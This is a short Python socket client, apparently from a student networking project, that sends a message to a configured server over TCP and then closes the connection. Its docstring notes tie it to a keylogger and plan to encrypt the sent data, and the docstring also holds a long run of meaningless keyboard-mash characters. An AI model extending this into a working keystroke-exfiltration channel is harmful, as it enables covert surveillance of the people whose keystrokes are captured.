'''
Basics of server.py from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherClient.py


Input message and send it! Then immediately close connection.

Consider putting this into the keylogger file? or maybe when doing encryption as
well it'll be nice to be separated...


I think the total message should be: 
AES(message) || P_server(AES key) || HASH (message so far)

then server decrypts the AES key and saves it with the IP address in a file
just for fun with the starting timer
do the encryption and hashing stuff AFTER config and setting up the files that
create files!!

server side checks if hash works, then continue (if not then delete)
--> do the hashing LAST!
what attack does hashing stop? message being modified in transit or data being lost
that TCP didn't notice

lkasdkfljdkjlsjkldsfjlkdasfljkdfsaljkdsfl;jkdfsljksdlk3858913475980473259804758902374598724389527678436587236458734890
983745789023870945923745823475809273459082740598723980457298347590287345980273598027345980723849572980345798017589017398407129087419083741927349017972890174092381749801327498123648712364857913265873654879346258796234897562837456298743568972346589723465879786328495634916387164193286471236481273649812736498712364987132657834658974365084350243758023894578942037529834578934757982346587293465873265897243658743658726458765873465827465897234658273645782364589287879287987462537896425376894523768978695423897645238677612534671523476152376453761254671253417645671352494397856257897648578293645672834578269784579682347985678923476842376823746878653247867869453267896789427963846798
'''
import socket

SERVER_PORT = 48939
SERVER_NAME = "localhost"
# SERVER_NAME = "192.168.64.2"
# SERVER_NAME = "100.74.201.144"

def sendMessage(message):

	clientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try: 
		clientSock.connect((SERVER_NAME, SERVER_PORT))
	except:
		print("FAILED TO CONNECT TO SERVER")
		return

	try:
		encoded = message.encode("utf-8")
	except:
		encoded = "COULD NOT ENCODE"

	clientSock.send(encoded)

	clientSock.close()
